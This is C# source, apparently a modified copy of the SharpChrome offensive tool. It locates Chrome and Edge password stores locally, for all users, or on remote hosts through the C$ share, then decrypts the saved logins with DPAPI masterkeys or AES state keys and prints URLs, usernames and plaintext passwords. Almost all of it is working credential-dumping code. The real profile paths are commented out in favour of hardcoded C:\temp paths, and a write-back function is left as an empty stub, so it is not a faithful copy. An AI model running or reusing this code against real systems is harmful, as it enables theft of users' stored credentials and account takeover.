using System;
using System.Collections.Generic;
using System.Diagnostics.CodeAnalysis;
using System.IO;
using System.Security.Policy;
using System.Text;
using SharpChrome.Extensions;
using SQLite;

namespace SharpChrome
{
    internal partial class Chrome
    {
        public static void TriageAndReturnChromeLogins(Dictionary<string, string> masterKeys, string computerName = "",
            string userFolder = "",
            string displayFormat = "table", bool showAll = false, bool unprotect = false, string stateKey = "",
            string browser = "chrome", bool quiet = false)
        {
            // triage all Chromium 'Login Data' files we can reach
            List<string> userDirectories = new List<string>();

            if (!string.IsNullOrEmpty(computerName)) {
                // if we're triaging a remote computer, check connectivity first
                if (!SharpDPAPI.Helpers.TestRemote(computerName)) {
                    return;
                }

                if (!string.IsNullOrEmpty(userFolder)) {
                    // if we have a user folder as the target to triage
                    userDirectories.Add(userFolder);
                }
                else {
                    // Assume C$ (vast majority of cases)
                    string userDirectoryBase = $"\\\\{computerName}\\C$\\Users\\";
                    userDirectories.AddRange(Directory.GetDirectories(userDirectoryBase));
                }
            }
            else if (!string.IsNullOrEmpty(userFolder)) {
                // if we have a user folder as the target to triage
                userDirectories.Add(userFolder);
            }
            else if (SharpDPAPI.Helpers.IsHighIntegrity()) {
                if ($"{System.Security.Principal.WindowsIdentity.GetCurrent().User}" == "S-1-5-18") {
                    // if we're SYSTEM
                    if (masterKeys.Count > 0) {
                        if (!quiet) {
                            Console.WriteLine("\r\n[*] Triaging {0} Logins for ALL users\r\n",
                                SharpDPAPI.Helpers.Capitalize(browser));
                        }

                        userDirectories = SharpDPAPI.Helpers.GetUserFolders();
                    }
                    else {
                        if (!quiet) {
                            Console.WriteLine("\r\n[!] Running as SYSTEM but no masterkeys supplied!");
                        }

                        return;
                    }
                }
                else if (masterKeys.Count == 0) {
                    // if we're elevated but not SYSTEM, and no masterkeys are supplied, assume we're triaging just the current user
                    if (!quiet) {
                        Console.WriteLine("\r\n[*] Triaging {0} Logins for current user\r\n",
                            SharpDPAPI.Helpers.Capitalize(browser));
                    }

                    userDirectories.Add(System.Environment.GetEnvironmentVariable("USERPROFILE"));
                    unprotect = true;
                }
                else {
                    // otherwise we're elevated and have masterkeys supplied, so assume we're triaging all users
                    if (!quiet) {
                        Console.WriteLine("\r\n[*] Triaging {0} Logins for ALL users\r\n",
                            SharpDPAPI.Helpers.Capitalize(browser));
                    }

                    userDirectories = SharpDPAPI.Helpers.GetUserFolders();
                }
            }
            else {
                // not elevated, no user folder specified, so triage current user
                if (!quiet) {
                    Console.WriteLine("\r\n[*] Triaging {0} Logins for current user\r\n",
                        SharpDPAPI.Helpers.Capitalize(browser));
                }

                userDirectories.Add(System.Environment.GetEnvironmentVariable("USERPROFILE"));
                unprotect = true;
            }

            foreach (string userDirectory in userDirectories) {
                //var chromeLoginDataPath = $"{userDirectory}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
                var chromeLoginDataPath = $@"C:\temp\chrome\Login Data";
                //var chromeAesStateKeyPath = $"{userDirectory}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State";
                var chromeAesStateKeyPath = $@"C:\temp\chrome\Local State";

                //var edgeLoginDataPath = $"{userDirectory}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data";
                var edgeLoginDataPath = $@"C:\temp\edge\Login Data";
                //var edgeAesStateKeyPath = $"{userDirectory}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State";
                var edgeAesStateKeyPath = $@"C:\temp\edge\Local State";

                byte[] chromeAesStateKey = GetStateKey(masterKeys, chromeAesStateKeyPath, unprotect, quiet);
                byte[] edgeAesStateKey = GetStateKey(masterKeys, edgeAesStateKeyPath, unprotect, quiet);

                 var chromeLogins = ParseAndReturnChromeLogins(masterKeys, chromeLoginDataPath, displayFormat, showAll, unprotect, chromeAesStateKey,
                    quiet);
                var edgePasswords = ParseAndReturnChromeLogins(masterKeys, edgeLoginDataPath, displayFormat, showAll, unprotect, edgeAesStateKey,
                    quiet);
            }
        }
    }

    public class ExtractedPassword
    {
        public string signon_realm { get; set; }
        public string origin_url { get; set; }
        public DateTime? date_created { get; set; }
        public string times_used { get; set; }
        public string username { get; set; }
        public string password { get; set; }

        public logins ToWritableLogin()
        {
            return new logins() {
                signon_realm = this.signon_realm,
                origin_url = this.origin_url,
                date_created = this.date_created.GetValueOrDefault().ToBinary(),
                times_used = int.Parse(this.times_used),
                username_value = this.username,
                password_value = Encoding.Default.GetBytes(this.password)
            };
        }
    }

    [SuppressMessage("ReSharper", "UnusedMember.Global"), SuppressMessage("ReSharper", "InconsistentNaming")]
    public class logins
    {
        private string _decryptedPasswordValue;

        /// <summary>Required when saving </summary>
        public string origin_url { get; set; }
        public string action_url { get; set; }
        public string username_element { get; set; }
        public string username_value { get; set; }
        public string password_element { get; set; }
        public byte[] password_value { get; set; }
        public string submit_element { get; set; }
        /// <summary>Required when saving </summary>
        public string signon_realm { get; set; }
        /// <summary>Required when saving </summary>
        public double date_created { get; set; }
        /// <summary>Required when saving </summary>
        public int blacklisted_by_user { get; set; }
        /// <summary>Required when saving </summary>
        public int scheme { get; set; }
        public int password_type { get; set; }
        public int times_used { get; set; }
        public byte[] form_data { get; set; }
        public string display_name { get; set; }
        public string icon_url { get; set; }
        public string federation_url { get; set; }
        public int skip_zero_click { get; set; }
        public int generation_upload_status { get; set; }
        public byte[] possible_username_pairs { get; set; }
        public int id { get; set; }
        /// <summary>Required when saving </summary>
        public double date_last_used { get; set; }
        public byte[] moving_blocked_for { get; set; }
        /// <summary>Required when saving </summary>
        public double date_password_modified { get; set; }

        public string decrypted_password_value => _decryptedPasswordValue;

        public void setDecrypted_password_value(string value) => _decryptedPasswordValue = value;
    }

    internal partial class Chrome
    {
        public static List<ExtractedPassword> ParseAndReturnChromeLogins(Dictionary<string, string> masterKeys, string loginDataFilePath,
            string displayFormat = "table", bool showAll = false, bool unprotect = false, byte[] aesStateKey = null,
            bool quiet = false)
        {
            // takes an individual 'Login Data' file path and performs decryption/triage on it
            if (!File.Exists(loginDataFilePath)) {
                return default;
            }

            BCrypt.SafeAlgorithmHandle hAlg = null;
            BCrypt.SafeKeyHandle hKey = null;

            if (aesStateKey != null) {
                // initialize the BCrypt key using the new DPAPI decryption method
                DPAPIChromeAlgKeyFromRaw(aesStateKey, out hAlg, out hKey);
            }

            // convert to a file:/// uri path type so we can do lockless opening
            //  ref - https://github.com/gentilkiwi/mimikatz/pull/199
            var uri = new System.Uri(loginDataFilePath);
            string loginDataFilePathUri = $"{uri.AbsoluteUri}?nolock=1";

            bool someResults = false;
            SQLiteConnection database = null;

            try {
                database = new SQLiteConnection(loginDataFilePathUri,
                    SQLiteOpenFlags.ReadOnly | SQLiteOpenFlags.OpenUri, false);
            }
            catch (Exception e) {
                Console.WriteLine("[X] {0}", e.InnerException.Message);
                return default;
            }

            if (!displayFormat.Equals("table") && !displayFormat.Equals("csv")) {
                Console.WriteLine("\r\n[X] Invalid format: {0}", displayFormat);
                return default;
            }

            string discriminatingQuery =
                "SELECT signon_realm, origin_url, username_value, password_value, times_used, cast(date_created as text) as date_created FROM logins";
            string everyColQuery = "SELECT * FROM logins";

            List<SQLiteQueryRow> results = database.Query2(everyColQuery, false);
            
            List<logins> allLogins = database.Query<logins>(everyColQuery, false);
            var allLoginsDecryptedPwd = allLogins.DecryptPasswords(aesStateKey);

            List<ExtractedPassword> passwords = new List<ExtractedPassword>(results.Count);

            foreach (SQLiteQueryRow row in results) {
                byte[] passwordBytes = (byte[])row.column[3].Value;
                byte[] decBytes = null;

                // decrypt the password bytes using masterkeys or CryptUnprotectData()

                if (HasV10Header(passwordBytes)) {
                    if (aesStateKey != null) {
                        // using the new DPAPI decryption method
                        decBytes = DecryptAESChromeBlob(passwordBytes, hAlg, hKey);

                        if (decBytes == null) {
                            continue;
                        }
                    }
                    else {
                        decBytes = Encoding.ASCII.GetBytes("--AES STATE KEY NEEDED--");
                    }
                }
                else {
                    // using the old method
                    decBytes = SharpDPAPI.Dpapi.DescribeDPAPIBlob(passwordBytes, masterKeys, "chrome", unprotect);
                }

                string password = Encoding.ASCII.GetString(decBytes);

                DateTime dateCreated = SharpDPAPI.Helpers.ConvertToDateTime(row.column[5].Value.ToString());

                if ((password != String.Empty) || showAll) {
                    if (displayFormat.Equals("table")) {
                        if (!someResults) {
                            Console.WriteLine("\r\n--- Credential (Path: {0}) ---\r\n", loginDataFilePath);
                        }

                        someResults = true;
                        Console.WriteLine("URL       : {0} ({1})", row.column[0].Value, row.column[1].Value);
                        Console.WriteLine("Created   : {0}", dateCreated);
                        Console.WriteLine("TimesUsed : {0}", row.column[4].Value);
                        Console.WriteLine("Username  : {0}", row.column[2].Value);
                        Console.WriteLine("Password  : {0}", password);
                        Console.WriteLine();
                    }
                    else {
                        if (!someResults) {
                            if (!quiet) {
                                Console.WriteLine("\r\n---  Credential (Path: {0}) ---\r\n", loginDataFilePath);
                            }
                            else {
                                Console.WriteLine("SEP=,");
                            }

                            Console.WriteLine("file_path,signon_realm,origin_url,date_created,times_used,username,password");
                        }

                        someResults = true;

                        var one = SharpDPAPI.Helpers.StringToCSVCell(loginDataFilePath);
                        var two = SharpDPAPI.Helpers.StringToCSVCell($"{row.column[0].Value}");
                        var three = SharpDPAPI.Helpers.StringToCSVCell($"{row.column[1].Value}");
                        var four = SharpDPAPI.Helpers.StringToCSVCell(dateCreated.ToString());
                        var five = SharpDPAPI.Helpers.StringToCSVCell($"{row.column[5].Value}");
                        var six = SharpDPAPI.Helpers.StringToCSVCell($"{row.column[2].Value}");
                        var seven = SharpDPAPI.Helpers.StringToCSVCell(password);

                        var ep = new ExtractedPassword() {
                            signon_realm = two,
                            origin_url = three,
                            date_created = dateCreated,
                            times_used = five,
                            username = six,
                            password = seven
                        };

                        passwords.Add(ep);

                        Console.WriteLine("{0},{1},{2},{3},{4},{5},{6}", one, two, three, four, five, six, seven);
                    }
                }
            }

            database.Close();

            return passwords;
        }
        
        public static void InsertPasswordsIntoDbFile(string loginDataFilePath, IEnumerable<ExtractedPassword> passwords)
        {
            var uri = new Uri(loginDataFilePath);
            string loginDataFilePathUri = $"{uri.AbsoluteUri}?nolock=1";
            SQLiteConnection database = null;
            
            database = new SQLiteConnection(loginDataFilePathUri, SQLiteOpenFlags.ReadWrite, false);

            //database.InsertOrReplace()
        }
    }
}